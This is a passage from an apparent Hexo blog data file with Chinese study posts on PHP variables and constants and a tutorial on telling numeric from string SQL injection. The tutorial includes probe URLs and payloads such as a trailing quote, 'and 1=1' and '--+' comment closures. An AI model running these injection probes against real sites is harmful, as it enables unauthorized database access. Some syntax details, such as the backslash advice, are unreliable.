可以生成动态页面内容\nPHP 可以创建、打开、读取、写入、关闭服务器上的文件\nPHP 可以收集表单数据\nPHP 可以发送和接收 cookies\nPHP 可以添加、删除、修改您的数据库中的数据\nPHP 可以限制用户访问您的网站上的一些页面\nPHP 可以加密数据\n\n**基本的 PHP 语法：**\n1、\nPHP 脚本以 <?php 开始，以 ?> 结束，\nPHP 文件的默认文件扩展名是 \".php\"。\nPHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。\n\n```\n<?php\n// 这是 PHP 单行注释\n\n/*\n这是\nPHP 多行\n注释\n*/\n?>\n```\n使用var_dump(变量名)可以输出变量的类型。\necho只会输出引号内的内容。\n2、**变量**\n1、定义：用于存储信息（数字，字符串等）的\"容器\"。\n给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。\n变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。\nphp的变量命名比C语言方便多了，使用的时候直接声明一下。\n类似于这样：\n\n```\n$txt=\"Hello world!\";\n$x=5;\n$y=10.5;\n```\n\n*PHP 变量规则：\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）*\n\n注意：\tPHP 语句和 PHP 变量都是区分大小写的。\n\n2、unset($变量名称)函数释放指定的变量。\n\n3、变量类型\n定义：指保存在该变量中的数据类型。\n\n1）bool（布尔型）\n表达了true或false，即真或假。\n以下值被认为false，其他的值都是被认为true。\n**布尔值false\n0\n浮点型0.0\n空白字符串和字符串0\n没有成员的数组\nNULL**\n\n2）int型（整形）\n$a=1;\n\n3)float（浮点型,也称double）\n\n$a=1.1;\n\n4)string(字符串)\n\n字符串是一系列的字符，字符串可以使用单引号，双引号，定界符三种方法来定义。\n\n**单引号：**\n指定一个简单的字持串最简单的方法是使用一对单引号‘’括起来，注意在单引号括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要反斜杠(\\)转义。\n单引号字符串中出现的变量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义鋼单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串！\n\n***问题：字符串中真正的反斜杠如何表达？\n  用  //***\n\n***双引号***\n双引号中的变量会被变量值所替代，即PHP会解析双引号中的变量。\n双引号中的变量不能直接使用，需要用 {} ， （）括起来。\n\n***定界符***\n<<<之后提供一个标识符开始，然后是字符串的内容，最后是同样的标识符表示结束。\n注意：结束标识符后必须接 ；\n\n标识符命名规则：字母，数字，下划线并且不能以数字开始。\n\n同样可以添加变量但是需要用花括号括起来。\n\n木了木了！！！\n\n","slug":"php学习--基础知识及变量（一）","published":1,"updated":"2020-05-20T15:38:19.452Z","comments":1,"layout":"post","link":"","_id":"ckchhpsh2000q9kq66mos77ch","content":"<p>﻿<strong>PHP 是什么？</strong><br>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。<br>PHP 脚本在服务器上执行。<br>PHP 可免费下载使用。</p>\n<p><strong>PHP 文件是什么？</strong><br>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码<br>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器<br>PHP 文件的默认文件扩展名是 “.php”</p>\n<p><strong>PHP 能做什么？</strong><br>PHP 可以生成动态页面内容<br>PHP 可以创建、打开、读取、写入、关闭服务器上的文件<br>PHP 可以收集表单数据<br>PHP 可以发送和接收 cookies<br>PHP 可以添加、删除、修改您的数据库中的数据<br>PHP 可以限制用户访问您的网站上的一些页面<br>PHP 可以加密数据</p>\n<p><strong>基本的 PHP 语法：</strong><br>1、<br>PHP 脚本以 <?php 开始，以 ?> 结束，<br>PHP 文件的默认文件扩展名是 “.php”。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F; 这是 PHP 单行注释</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*</span><br><span class=\"line\">这是</span><br><span class=\"line\">PHP 多行</span><br><span class=\"line\">注释</span><br><span class=\"line\">*&#x2F;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>使用var_dump(变量名)可以输出变量的类型。<br>echo只会输出引号内的内容。<br>2、<strong>变量</strong><br>1、定义：用于存储信息（数字，字符串等）的”容器”。<br>给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。<br>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。<br>php的变量命名比C语言方便多了，使用的时候直接声明一下。<br>类似于这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$txt&#x3D;&quot;Hello world!&quot;;</span><br><span class=\"line\">$x&#x3D;5;</span><br><span class=\"line\">$y&#x3D;10.5;</span><br></pre></td></tr></table></figure>\n\n<p><em>PHP 变量规则：<br>变量以 $ 符号开始，后面跟着变量的名称<br>变量名必须以字母或者下划线字符开始<br>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）<br>变量名不能包含空格<br>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</em></p>\n<p>注意：    PHP 语句和 PHP 变量都是区分大小写的。</p>\n<p>2、unset($变量名称)函数释放指定的变量。</p>\n<p>3、变量类型<br>定义：指保存在该变量中的数据类型。</p>\n<p>1）bool（布尔型）<br>表达了true或false，即真或假。<br>以下值被认为false，其他的值都是被认为true。<br><strong>布尔值false<br>0<br>浮点型0.0<br>空白字符串和字符串0<br>没有成员的数组<br>NULL</strong></p>\n<p>2）int型（整形）<br>$a=1;</p>\n<p>3)float（浮点型,也称double）</p>\n<p>$a=1.1;</p>\n<p>4)string(字符串)</p>\n<p>字符串是一系列的字符，字符串可以使用单引号，双引号，定界符三种方法来定义。</p>\n<p><strong>单引号：</strong><br>指定一个简单的字持串最简单的方法是使用一对单引号‘’括起来，注意在单引号括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要反斜杠()转义。<br>单引号字符串中出现的变量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义鋼单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串！</p>\n<p><strong><em>问题：字符串中真正的反斜杠如何表达？<br>  用  //</em></strong></p>\n<p><strong><em>双引号</em></strong><br>双引号中的变量会被变量值所替代，即PHP会解析双引号中的变量。<br>双引号中的变量不能直接使用，需要用 {} ， （）括起来。</p>\n<p><strong><em>定界符</em></strong><br>&lt;&lt;&lt;之后提供一个标识符开始，然后是字符串的内容，最后是同样的标识符表示结束。<br>注意：结束标识符后必须接 ；</p>\n<p>标识符命名规则：字母，数字，下划线并且不能以数字开始。</p>\n<p>同样可以添加变量但是需要用花括号括起来。</p>\n<p>木了木了！！！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿<strong>PHP 是什么？</strong><br>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。<br>PHP 脚本在服务器上执行。<br>PHP 可免费下载使用。</p>\n<p><strong>PHP 文件是什么？</strong><br>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码<br>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器<br>PHP 文件的默认文件扩展名是 “.php”</p>\n<p><strong>PHP 能做什么？</strong><br>PHP 可以生成动态页面内容<br>PHP 可以创建、打开、读取、写入、关闭服务器上的文件<br>PHP 可以收集表单数据<br>PHP 可以发送和接收 cookies<br>PHP 可以添加、删除、修改您的数据库中的数据<br>PHP 可以限制用户访问您的网站上的一些页面<br>PHP 可以加密数据</p>\n<p><strong>基本的 PHP 语法：</strong><br>1、<br>PHP 脚本以 <?php 开始，以 ?> 结束，<br>PHP 文件的默认文件扩展名是 “.php”。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F; 这是 PHP 单行注释</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*</span><br><span class=\"line\">这是</span><br><span class=\"line\">PHP 多行</span><br><span class=\"line\">注释</span><br><span class=\"line\">*&#x2F;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>使用var_dump(变量名)可以输出变量的类型。<br>echo只会输出引号内的内容。<br>2、<strong>变量</strong><br>1、定义：用于存储信息（数字，字符串等）的”容器”。<br>给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。<br>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。<br>php的变量命名比C语言方便多了，使用的时候直接声明一下。<br>类似于这样：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$txt&#x3D;&quot;Hello world!&quot;;</span><br><span class=\"line\">$x&#x3D;5;</span><br><span class=\"line\">$y&#x3D;10.5;</span><br></pre></td></tr></table></figure>\n\n<p><em>PHP 变量规则：<br>变量以 $ 符号开始，后面跟着变量的名称<br>变量名必须以字母或者下划线字符开始<br>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）<br>变量名不能包含空格<br>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</em></p>\n<p>注意：    PHP 语句和 PHP 变量都是区分大小写的。</p>\n<p>2、unset($变量名称)函数释放指定的变量。</p>\n<p>3、变量类型<br>定义：指保存在该变量中的数据类型。</p>\n<p>1）bool（布尔型）<br>表达了true或false，即真或假。<br>以下值被认为false，其他的值都是被认为true。<br><strong>布尔值false<br>0<br>浮点型0.0<br>空白字符串和字符串0<br>没有成员的数组<br>NULL</strong></p>\n<p>2）int型（整形）<br>$a=1;</p>\n<p>3)float（浮点型,也称double）</p>\n<p>$a=1.1;</p>\n<p>4)string(字符串)</p>\n<p>字符串是一系列的字符，字符串可以使用单引号，双引号，定界符三种方法来定义。</p>\n<p><strong>单引号：</strong><br>指定一个简单的字持串最简单的方法是使用一对单引号‘’括起来，注意在单引号括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要反斜杠()转义。<br>单引号字符串中出现的变量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义鋼单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串！</p>\n<p><strong><em>问题：字符串中真正的反斜杠如何表达？<br>  用  //</em></strong></p>\n<p><strong><em>双引号</em></strong><br>双引号中的变量会被变量值所替代，即PHP会解析双引号中的变量。<br>双引号中的变量不能直接使用，需要用 {} ， （）括起来。</p>\n<p><strong><em>定界符</em></strong><br>&lt;&lt;&lt;之后提供一个标识符开始，然后是字符串的内容，最后是同样的标识符表示结束。<br>注意：结束标识符后必须接 ；</p>\n<p>标识符命名规则：字母，数字，下划线并且不能以数字开始。</p>\n<p>同样可以添加变量但是需要用花括号括起来。</p>\n<p>木了木了！！！</p>\n"},{"title":"php学习--常量（二）","date":"2020-05-05T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp"],"_content":"\n\n\n﻿# 常量\n\n1、概念：\n               常量是用于临时（只有在我们的程序运行过程中才存在）存储值（数据）的容器。\n 2、定义和使用：\n                define（'常量名称'，常量值） 或者     define（\"常量名称\"，常量值）（和C语言的宏常量命名相似）\n            常量的命名：\n            1）和变量一样，只能包含字母数字下划线，必须以字母或者下划线开头。\n            2） 按照惯例常量名字总是大写，根据个人习惯不做强求。\n            3）自己定义的常量是严格区分大小写的。\n            defined（）函数来检查是否定义了某个常量。\n  3、常量和变量的区别。\n             1）常量的前面没有美元符号（$）\n              2) 常量只能用define（）函数定义，不能通过赋值语句。\n              3）常量可以不用理会变量范围的规则而在任何地方定义和使用。（和C语言一样）\n              4）常量一旦被定义就不能被重新定义或者取消定义。\n              5）常量的值只能说bool,int,float,string类型。\n     4、预定义常量：\n                  就是我们php内核已经帮我们定义好了的常量。\n                  怎么感觉就是c,c++里面的库，用的时候前面调用一下就行了。\n              1）预定义常量是以__开头的，又被称为魔术常量。\n              2）预定义常量不区分大小写。\n              代码所在位置不同它的值也是不同的。\n         八个常用魔术变量：\n     \n\n```\n     (1). __FILE__                当前文件路径\n     (2). __DIR__                  当前文件目录\n     (3). __LINE__                 在文件文件的那一行 \n     (4). __FUNCTION__       在当前文件的那个函数中       返回 函数名\n     (5). __CLASS__             在当前文件中的那个类中       返回 类名\n     (6). __METHOD__          在当前文件的类中的那个方法中 返回 类名::方法名\n     (7). __Trait__                   名包括其被声明的作用区域，从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖\n     (8).__NAMESPACE__     当前命名空间的名称（区分大小写）。此常量是在编译时定义的.\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200425121650888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n","source":"_posts/php学习--常量（二）.md","raw":"---\ntitle: php学习--常量（二）\ndate: 2020-05-05 15:04:05\ntags: php学习\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp\n---\n\n\n\n﻿# 常量\n\n1、概念：\n               常量是用于临时（只有在我们的程序运行过程中才存在）存储值（数据）的容器。\n 2、定义和使用：\n                define（'常量名称'，常量值） 或者     define（\"常量名称\"，常量值）（和C语言的宏常量命名相似）\n            常量的命名：\n            1）和变量一样，只能包含字母数字下划线，必须以字母或者下划线开头。\n            2） 按照惯例常量名字总是大写，根据个人习惯不做强求。\n            3）自己定义的常量是严格区分大小写的。\n            defined（）函数来检查是否定义了某个常量。\n  3、常量和变量的区别。\n             1）常量的前面没有美元符号（$）\n              2) 常量只能用define（）函数定义，不能通过赋值语句。\n              3）常量可以不用理会变量范围的规则而在任何地方定义和使用。（和C语言一样）\n              4）常量一旦被定义就不能被重新定义或者取消定义。\n              5）常量的值只能说bool,int,float,string类型。\n     4、预定义常量：\n                  就是我们php内核已经帮我们定义好了的常量。\n                  怎么感觉就是c,c++里面的库，用的时候前面调用一下就行了。\n              1）预定义常量是以__开头的，又被称为魔术常量。\n              2）预定义常量不区分大小写。\n              代码所在位置不同它的值也是不同的。\n         八个常用魔术变量：\n     \n\n```\n     (1). __FILE__                当前文件路径\n     (2). __DIR__                  当前文件目录\n     (3). __LINE__                 在文件文件的那一行 \n     (4). __FUNCTION__       在当前文件的那个函数中       返回 函数名\n     (5). __CLASS__             在当前文件中的那个类中       返回 类名\n     (6). __METHOD__          在当前文件的类中的那个方法中 返回 类名::方法名\n     (7). __Trait__                   名包括其被声明的作用区域，从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖\n     (8).__NAMESPACE__     当前命名空间的名称（区分大小写）。此常量是在编译时定义的.\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200425121650888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n","slug":"php学习--常量（二）","published":1,"updated":"2020-05-11T09:04:29.242Z","comments":1,"layout":"post","link":"","_id":"ckchhpsh4000u9kq63p9y4tgr","content":"<p>﻿# 常量</p>\n<p>1、概念：<br>               常量是用于临时（只有在我们的程序运行过程中才存在）存储值（数据）的容器。<br> 2、定义和使用：<br>                define（’常量名称’，常量值） 或者     define（”常量名称”，常量值）（和C语言的宏常量命名相似）<br>            常量的命名：<br>            1）和变量一样，只能包含字母数字下划线，必须以字母或者下划线开头。<br>            2） 按照惯例常量名字总是大写，根据个人习惯不做强求。<br>            3）自己定义的常量是严格区分大小写的。<br>            defined（）函数来检查是否定义了某个常量。<br>  3、常量和变量的区别。<br>             1）常量的前面没有美元符号（$）<br>              2) 常量只能用define（）函数定义，不能通过赋值语句。<br>              3）常量可以不用理会变量范围的规则而在任何地方定义和使用。（和C语言一样）<br>              4）常量一旦被定义就不能被重新定义或者取消定义。<br>              5）常量的值只能说bool,int,float,string类型。<br>     4、预定义常量：<br>                  就是我们php内核已经帮我们定义好了的常量。<br>                  怎么感觉就是c,c++里面的库，用的时候前面调用一下就行了。<br>              1）预定义常量是以__开头的，又被称为魔术常量。<br>              2）预定义常量不区分大小写。<br>              代码所在位置不同它的值也是不同的。<br>         八个常用魔术变量：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(1). __FILE__                当前文件路径</span><br><span class=\"line\">(2). __DIR__                  当前文件目录</span><br><span class=\"line\">(3). __LINE__                 在文件文件的那一行 </span><br><span class=\"line\">(4). __FUNCTION__       在当前文件的那个函数中       返回 函数名</span><br><span class=\"line\">(5). __CLASS__             在当前文件中的那个类中       返回 类名</span><br><span class=\"line\">(6). __METHOD__          在当前文件的类中的那个方法中 返回 类名::方法名</span><br><span class=\"line\">(7). __Trait__                   名包括其被声明的作用区域，从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖</span><br><span class=\"line\">(8).__NAMESPACE__     当前命名空间的名称（区分大小写）。此常量是在编译时定义的.</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200425121650888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿# 常量</p>\n<p>1、概念：<br>               常量是用于临时（只有在我们的程序运行过程中才存在）存储值（数据）的容器。<br> 2、定义和使用：<br>                define（’常量名称’，常量值） 或者     define（”常量名称”，常量值）（和C语言的宏常量命名相似）<br>            常量的命名：<br>            1）和变量一样，只能包含字母数字下划线，必须以字母或者下划线开头。<br>            2） 按照惯例常量名字总是大写，根据个人习惯不做强求。<br>            3）自己定义的常量是严格区分大小写的。<br>            defined（）函数来检查是否定义了某个常量。<br>  3、常量和变量的区别。<br>             1）常量的前面没有美元符号（$）<br>              2) 常量只能用define（）函数定义，不能通过赋值语句。<br>              3）常量可以不用理会变量范围的规则而在任何地方定义和使用。（和C语言一样）<br>              4）常量一旦被定义就不能被重新定义或者取消定义。<br>              5）常量的值只能说bool,int,float,string类型。<br>     4、预定义常量：<br>                  就是我们php内核已经帮我们定义好了的常量。<br>                  怎么感觉就是c,c++里面的库，用的时候前面调用一下就行了。<br>              1）预定义常量是以__开头的，又被称为魔术常量。<br>              2）预定义常量不区分大小写。<br>              代码所在位置不同它的值也是不同的。<br>         八个常用魔术变量：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(1). __FILE__                当前文件路径</span><br><span class=\"line\">(2). __DIR__                  当前文件目录</span><br><span class=\"line\">(3). __LINE__                 在文件文件的那一行 </span><br><span class=\"line\">(4). __FUNCTION__       在当前文件的那个函数中       返回 函数名</span><br><span class=\"line\">(5). __CLASS__             在当前文件中的那个类中       返回 类名</span><br><span class=\"line\">(6). __METHOD__          在当前文件的类中的那个方法中 返回 类名::方法名</span><br><span class=\"line\">(7). __Trait__                   名包括其被声明的作用区域，从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖</span><br><span class=\"line\">(8).__NAMESPACE__     当前命名空间的名称（区分大小写）。此常量是在编译时定义的.</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200425121650888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n"},{"title":"判断注入类型","date":"2020-04-06T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(8).jpg.webp"],"_content":"\n\n\n前几天看到一篇文章说大部分注入都可以用整形注入和字符型注入来概括。\n所以我就看了看做了一些题目。（勉强获得发的发言权）\n简单的理解:\n数字型： SELECT 列 FROM 表 WHERE 数字型列=值\n\n字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’\n深层次的理解：\n***1、数字型注入***\n当输入的参数为整形时（1  ，2， 3....），如果存在注入漏洞，可以认为是数字型注入。\n测试步骤：\n（1）加单引号，双引号（等等闭合符号）URL()：www.text.com/text.php?id=3’（判断是不是字符型注入）\n对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；\n（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1\n对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；\n（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2\n对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异\n如果满足以上三点，则可以判断该URL存在数字型注入。\n\n\n***2、字符型注入***\n当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。\n例如数字型语句：select * from table where id =3\n则字符型如下：select * from table where name=’admin’\n因此，在构造payload时通过闭合单引号可以成功执行语句：\n测试步骤：\n（1） 加单引号：select * from table where name=’admin’’\n由于加单引号后变成三个单引号，则无法执行，程序会报错（需掌握php语言的一些知识）；\n（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；\nMysql 有三种常用注释符：\n--+注意，这种注释符后边有一个空格\n\n#通过#进行注释\n\n/* */ 注释掉符号内的内容\n\n因此，构造语句为：select * from table where name =’admin’ and 1=1--+’ 可成功执行返回结果正确；\n（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错\n如果满足以上三点，可以判断该url为字符型注入。\n习题持续更新。（未完待续。。。）\n","source":"_posts/判断注入类型是字符型还是整形！！！.md","raw":"---\ntitle: 判断注入类型\ndate: 2020-04-06 15:04:05\ntags: SQL注入\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(8).jpg.webp\n---\n\n\n\n前几天看到一篇文章说大部分注入都可以用整形注入和字符型注入来概括。\n所以我就看了看做了一些题目。（勉强获得发的发言权）\n简单的理解:\n数字型： SELECT 列 FROM 表 WHERE 数字型列=值\n\n字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’\n深层次的理解：\n***1、数字型注入***\n当输入的参数为整形时（1  ，2， 3....），如果存在注入漏洞，可以认为是数字型注入。\n测试步骤：\n（1）加单引号，双引号（等等闭合符号）URL()：www.text.com/text.php?id=3’（判断是不是字符型注入）\n对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；\n（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1\n对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；\n（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2\n对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异\n如果满足以上三点，则可以判断该URL存在数字型注入。\n\n\n***2、字符型注入***\n当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。\n例如数字型语句：select * from table where id =3\n则字符型如下：select * from table where name=’admin’\n因此，在构造payload时通过闭合单引号可以成功执行语句：\n测试步骤：\n（1） 加单引号：select * from table where name=’admin’’\n由于加单引号后变成三个单引号，则无法执行，程序会报错（需掌握php语言的一些知识）；\n（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；\nMysql 有三种常用注释符：\n--+注意，这种注释符后边有一个空格\n\n#通过#进行注释\n\n/* */ 注释掉符号内的内容\n\n因此，构造语句为：select * from table where name =’admin’ and 1=1--+’ 可成功执行返回结果正确；\n（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错\n如果满足以上三点，可以判断该url为字符型注入。\n习题持续更新。（未完待续。。。）\n","slug":"判断注入类型是字符型还是整形！！！","published":1,"updated":"2020-05-20T15:36:18.450Z","comments":1,"layout":"post","link":"","_id":"ckchhpsh6000x9kq6cssxe42f","content":"<p>前几天看到一篇文章说大部分注入都可以用整形注入和字符型注入来概括。<br>所以我就看了看做了一些题目。（勉强获得发的发言权）<br>简单的理解:<br>数字型： SELECT 列 FROM 表 WHERE 数字型列=值</p>\n<p>字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’<br>深层次的理解：<br><strong><em>1、数字型注入</em></strong><br>当输入的参数为整形时（1  ，2， 3….），如果存在注入漏洞，可以认为是数字型注入。<br>测试步骤：<br>（1）加单引号，双引号（等等闭合符号）URL()：<a href=\"http://www.text.com/text.php?id=3’（判断是不是字符型注入）\" target=\"_blank\" rel=\"noopener\">www.text.com/text.php?id=3’（判断是不是字符型注入）</a><br>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；<br>（2） 加and 1=1 ,URL：<a href=\"http://www.text.com/text.php?id=3\" target=\"_blank\" rel=\"noopener\">www.text.com/text.php?id=3</a> and 1=1<br>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；<br>（3） 加and 1=2，URL：<a href=\"http://www.text.com/text.php?id=3\" target=\"_blank\" rel=\"noopener\">www.text.com/text.php?id=3</a> and 1=2<br>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异<br>如果满足以上三点，则可以判断该URL存在数字型注入。</p>\n<p><strong><em>2、字符型注入</em></strong><br>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。<br>例如数字型语句：select * from table where id =3<br>则字符型如下：select * from table where name=’admin’<br>因此，在构造payload时通过闭合单引号可以成功执行语句：<br>测试步骤：<br>（1） 加单引号：select * from table where name=’admin’’<br>由于加单引号后变成三个单引号，则无法执行，程序会报错（需掌握php语言的一些知识）；<br>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；<br>Mysql 有三种常用注释符：<br>–+注意，这种注释符后边有一个空格</p>\n<p>#通过#进行注释</p>\n<p>/* */ 注释掉符号内的内容</p>\n<p>因此，构造语句为：select * from table where name =’admin’ and 1=1–+’ 可成功执行返回结果正确；<br>（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错<br>如果满足以上三点，可以判断该url为字符型注入。<br>习题持续更新。（未完待续。。。）</p>\n","site":{"data":{}},"excerpt":"","more":"<p>前几天看到一篇文章说大部分注入都可以用整形注入和字符型注入来概括。<br>所以我就看了看做了一些题目。（勉强获得发的发言权）<br>简单的理解:<br>数字型： SELECT 列 FROM 表 WHERE 数字型列=值</p>\n<p>字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’<br>深层次的理解：<br><strong><em>1、数字型注入</em></strong><br>当输入的参数为整形时（1  ，2， 3….），如果存在注入漏洞，可以认为是数字型注入。<br>测试步骤：<br>（1）加单引号，双引号（等等闭合符号）URL()：<a href=\"http://www.text.com/text.php?id=3’（判断是不是字符型注入）\" target=\"_blank\" rel=\"noopener\">www.text.com/text.php?id=3’（判断是不是字符型注入）</a><br>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；<br>（2） 加and 1=1 ,URL：<a href=\"http://www.text.com/text.php?id=3\" target=\"_blank\" rel=\"noopener\">www.text.com/text.php?id=3</a> and 1=1<br>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；<br>（3） 加and 1=2，URL：<a href=\"http://www.text.com/text.php?id=3\" target=\"_blank\" rel=\"noopener\">www.text.com/text.php?id=3</a> and 1=2<br>对应的sql：select * from table where id=3 and 1=2 